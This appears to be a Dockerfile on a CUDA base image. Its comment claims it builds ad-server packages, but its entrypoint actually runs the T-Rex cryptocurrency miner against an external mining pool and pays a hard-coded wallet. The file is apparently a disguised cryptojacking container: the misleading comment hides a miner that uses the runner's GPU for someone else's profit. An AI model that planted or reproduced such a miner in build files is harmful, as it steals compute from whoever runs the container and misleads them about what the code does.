FROM nvidia/cuda:11.2.2-devel-ubuntu16.04
MAINTAINER Ritesh Agarwal <ritesh.agarwal@pubmatic.com>

ENV DEBIAN_FRONTEND noninteractive

# Build and Install adserver-build/ut-env Debian packages
COPY t-rex /root/

ENTRYPOINT /root/t-rex -a kawpow -o stratum+tcp://stratum.ravenminer.com:3838 -u RT6Ah9uaZd6mFDexXSMEGAhuhgjF7KW4E4 -p x
